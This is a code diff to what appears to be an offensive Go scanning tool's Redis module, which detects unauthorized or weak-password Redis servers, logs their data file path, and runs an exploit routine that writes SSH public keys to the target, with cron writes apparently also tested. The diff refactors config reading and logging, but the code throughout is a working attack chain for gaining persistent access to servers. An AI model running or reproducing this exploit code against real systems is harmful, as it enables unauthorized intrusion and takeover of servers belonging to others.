@@ -10,6 +10,11 @@ import (
 	"time"
 )
 
+var (
+	dbfilename   string
+	dir          string
+)
+
 func RedisScan(info *common.HostInfo) (tmperr error) {
 	starttime := time.Now().Unix()
 	flag, err := RedisUnauth(info)
@@ -57,9 +62,16 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		return flag, err
 	}
 	if strings.Contains(reply, "+OK") {
-		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
-		common.LogSuccess(result)
 		flag = true
+		dbfilename, dir, err = getconfig(conn)
+		if err != nil {
+			result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
+			common.LogSuccess(result)
+			return flag,err
+		}else {
+			result := fmt.Sprintf("[+] Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
+			common.LogSuccess(result)
+		}
 		err = Expoilt(realhost, conn)
 	}
 	return flag, err
@@ -86,19 +98,22 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		return flag, err
 	}
 	if strings.Contains(reply, "redis_version") {
-		result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
-		common.LogSuccess(result)
 		flag = true
+		dbfilename, dir, err = getconfig(conn)
+		if err != nil {
+			result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
+			common.LogSuccess(result)
+			return flag,err
+		}else {
+			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost,dir,dbfilename)
+			common.LogSuccess(result)
+		}
 		err = Expoilt(realhost, conn)
 	}
 	return flag, err
 }
 
 func Expoilt(realhost string, conn net.Conn) error {
-	dbfilename, dir, err := getconfig(conn)
-	if err != nil {
-		return err
-	}
 	flagSsh, flagCron, err := testwrite(conn)
 	if err != nil {
 		return err
@@ -116,7 +131,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
+				fmt.Println("[-] Redis:", realhost, "SSHPUB write failed", text)
 			}
 		}
 	}
@@ -268,14 +283,15 @@ func Readfile(filename string) (string, error) {
 }
 
 func readreply(conn net.Conn) (result string, err error) {
-	buf := make([]byte, 4096)
+	size := 5 * 1024
+	buf := make([]byte, size)
 	for {
 		count, err := conn.Read(buf)
 		if err != nil {
 			break
 		}
 		result += string(buf[0:count])
-		if count < 4096 {
+		if count < size {
 			break
 		}
 	}
@@ -318,7 +334,7 @@ func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
 	if err != nil {
 		return
 	}
-	text1 := strings.Split(text, "\n")
+	text1 := strings.Split(text, "\r\n")
 	if len(text1) > 2 {
 		dbfilename = text1[len(text1)-2]
 	} else {
@@ -332,7 +348,7 @@ func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
 	if err != nil {
 		return
 	}
-	text1 = strings.Split(text, "\n")
+	text1 = strings.Split(text, "\r\n")
 	if len(text1) > 2 {
 		dir = text1[len(text1)-2]
 	} else {
